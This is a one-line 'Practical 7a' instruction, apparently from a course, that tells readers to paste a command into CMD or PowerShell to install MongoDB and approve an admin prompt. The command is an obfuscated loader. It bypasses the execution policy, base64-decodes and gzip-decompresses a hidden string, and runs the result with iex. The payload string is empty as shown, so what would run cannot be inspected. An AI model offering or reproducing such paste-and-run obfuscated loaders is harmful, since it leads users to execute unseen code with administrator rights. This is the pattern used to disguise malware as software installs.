# Practical 7a - paste into CMD or PowerShell, from ANY folder | installs MongoDB Server + Compass + mongosh (approve the admin prompt). If it says mongosh not found, open a NEW window and run 7a again
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object IO.StreamReader((New-Object IO.Compression.GZipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''))),[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd())"
